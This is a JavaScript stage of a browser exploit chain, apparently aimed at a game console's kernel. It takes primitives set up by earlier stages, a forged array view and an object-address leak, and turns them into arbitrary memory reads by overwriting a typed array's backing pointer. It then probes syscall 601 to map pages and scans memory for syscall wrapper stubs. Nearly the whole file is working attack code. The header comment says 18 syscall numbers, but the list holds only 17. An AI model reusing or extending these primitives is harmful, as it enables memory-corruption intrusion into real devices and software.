// Wide wrapper recovery sweep. 18 syscall numbers verified absent from
// the 7-page locate window (561,562,568-571,573,589,590,609,614,621,
// 631,644,645,650,651) — most with canonical names: 573 mdbg_call (the
// sibling of defect syscall 601 mdbg_service), 589 dynlib_dlopen, 590
// dynlib_dlclose, 609 budget_getid, 614 prepare_to_suspend_process.
// Method: (1) 601-as-oracle maps the module extent page-by-page around
// the anchor (601 walks non-0xFFFFFFFF-hi addresses: ENOSYS mapped /
// EFAULT unmapped — safe, no fault reaches us); (2) mapped pages are
// read via the forged view and pattern-scanned for the 16-byte
// wrapper stubs of the 18 numbers. Reports numbers + page offsets
// only (absolute addresses are per-boot). Markers 5 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys601 !== "number")
    throw new Error("chain_or_call64_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function wrapperBytes(number) {
    return [0x48, 0xc7, 0xc0, number & 255, (number >>> 8) & 255,
      0, 0, 0x49, 0x89, 0xca, 0x0f, 0x05, 0x72, 0x01, 0xc3, 0x48];
  }
  var anchor = plan.target & ~0xfff;
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("ws_preflight");
  // Step 1: map the module extent with the 601 oracle, page-granular,
  // anchor-128KB .. anchor+128KB, 4KB steps (64 probes)
  phase = "extent";
  var lo = anchor - 131072, hi = anchor + 131072;
  var mapped = {};
  var firstMapped = -1, lastMapped = -1;
  for (var pg = lo; pg <= hi; pg += 4096) {
    var plo = pg % 0x100000000;
    var phi = Math.floor(pg / 0x100000000);
    var c = native.call64("sys601", [[plo, phi], [0x1000, 0]]);
    var e = (c.value === -1) ? native.readErrno() : null;
    if (c.value === 0 || (c.value === -1 && e !== 14)) {
      mapped[pg] = true;
      if (firstMapped === -1) firstMapped = pg;
      lastMapped = pg;
    }
  }
  mark("ws_extent_done");
  // Step 2: pattern-scan mapped pages for the 18 missing wrappers
  phase = "scan";
  var wanted = [561, 562, 568, 569, 570, 571, 573, 589, 590,
    609, 614, 621, 631, 644, 645, 650, 651];
  var patterns = {};
  for (var w = 0; w < wanted.length; w++)
    patterns[wanted[w]] = wrapperBytes(wanted[w]);
  var found = [];
  var pagesScanned = 0;
  for (var mp = firstMapped; mp !== -1 && mp <= lastMapped;
       mp += 4096) {
    if (!mapped[mp]) continue;
    var page = [];
    for (var off = 0; off < 4096; off += 192)
      page.push.apply(page, readAt(mp + off,
        Math.min(192, 4096 - off)));
    pagesScanned++;
    for (var numWanted = 0; numWanted < wanted.length; numWanted++) {
      var num = wanted[numWanted];
      var pat = patterns[num];
      for (var o = 0; o + 16 <= 4096; o++) {
        if (page[o] !== pat[0] || page[o + 12] !== pat[12])
          continue;
        var hit = true;
        for (var b = 1; b < 16; b++)
          if (page[o + b] !== pat[b]) { hit = false; break; }
        if (hit) {
          found.push(num + "@+" + (mp - anchor + o));
          break;
        }
      }
    }
  }
  mark("ws_scan_done");
  var after = native.call("getpid", []);
  mark("ws_done");
  result = { id: "wrapper_wide_scan_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { anchor_page: anchor.toString(16),
      extent_lo: firstMapped === -1 ? "" :
        (firstMapped - anchor).toString(16),
      extent_hi: lastMapped === -1 ? "" :
        (lastMapped - anchor).toString(16),
      pages_scanned: pagesScanned,
      found: found.join(",") || "none",
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "wrapper_wide_scan_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
